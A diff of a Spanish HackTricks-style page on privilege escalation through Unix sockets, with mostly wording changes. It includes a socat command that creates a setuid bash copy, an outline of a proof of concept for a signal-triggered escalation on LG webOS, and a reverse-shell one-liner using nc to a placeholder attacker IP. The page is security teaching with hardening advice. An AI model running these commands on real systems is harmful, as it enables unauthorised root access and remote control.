@@ -4,7 +4,7 @@
 
 ## Ejemplo de binding de un socket con Python
 
-En el siguiente ejemplo se crea un **unix socket** (`/tmp/socket_test.s`) y todo lo **recibido** se va a **ejecutar** mediante `os.system`. Sé que no vas a encontrar esto en un entorno real, pero el objetivo de este ejemplo es mostrar cómo es el código que utiliza unix sockets y cómo gestionar la entrada en el peor caso posible.
+En el siguiente ejemplo se crea un **unix socket** (`/tmp/socket_test.s`) y todo lo **recibido** se va a **ejecutar** mediante `os.system`.Sé que no vas a encontrar esto en la práctica, pero el objetivo de este ejemplo es mostrar cómo es el código que utiliza unix sockets y cómo gestionar la entrada en el peor caso posible.
 ```python:s.py
 import socket
 import os, os.path
@@ -37,17 +37,17 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Caso de estudio: escalada activada por una señal en un socket UNIX propiedad de root (LG webOS)
+## Caso práctico: escalada activada por signal mediante un UNIX socket propiedad de root (LG webOS)
 
-Algunos daemons privilegiados exponen un socket UNIX propiedad de root que acepta entradas no confiables y vincula acciones privilegiadas a los thread-IDs y las señales. Si el protocolo permite que un cliente sin privilegios influya en qué thread nativo recibe la señal, es posible activar una ruta de código privilegiada y escalar privilegios.
+Algunos daemons privilegiados exponen un UNIX socket propiedad de root que acepta entradas no confiables y vincula acciones privilegiadas a thread-IDs y signals. Si el protocolo permite que un cliente sin privilegios influya en qué native thread se selecciona como objetivo, es posible que puedas activar una ruta de código privilegiada y escalar privilegios.<sup>[[1]](#references)</sup>
 
 Patrón observado:
 - Conectarse a un socket propiedad de root (por ejemplo, /tmp/remotelogger).
-- Crear un thread y obtener su identificador nativo (TID).
-- Enviar el TID (packed) junto con padding como solicitud; recibir un acuse de recibo.
-- Enviar una señal específica a ese TID para activar el comportamiento privilegiado.
+- Crear un thread y obtener su native thread id (TID).
+- Enviar el TID (packed) más padding como solicitud; recibir un acknowledgement.
+- Enviar un signal específico a ese TID para activar el comportamiento privilegiado.
 
-Esquema mínimo del PoC:
+Esquema mínimo de PoC:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -66,10 +66,10 @@ cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Notas:
 - Esta clase de bugs surge al confiar en valores derivados del estado del cliente sin privilegios (TIDs) y vincularlos a signal handlers o lógica con privilegios.
-- Refuerza la seguridad aplicando credenciales en el socket, validando los formatos de los mensajes y desacoplando las operaciones con privilegios de los identificadores de thread proporcionados externamente.
+- Refuerza la seguridad imponiendo credenciales en el socket, validando los formatos de los mensajes y desacoplando las operaciones con privilegios de los identificadores de thread proporcionados externamente.
 
 ## Referencias
 
-- [Path Traversal, Authentication Bypass y Full Device Takeover en LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [Path Traversal, Authentication Bypass y Full Device Takeover en LG WebOS TV (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
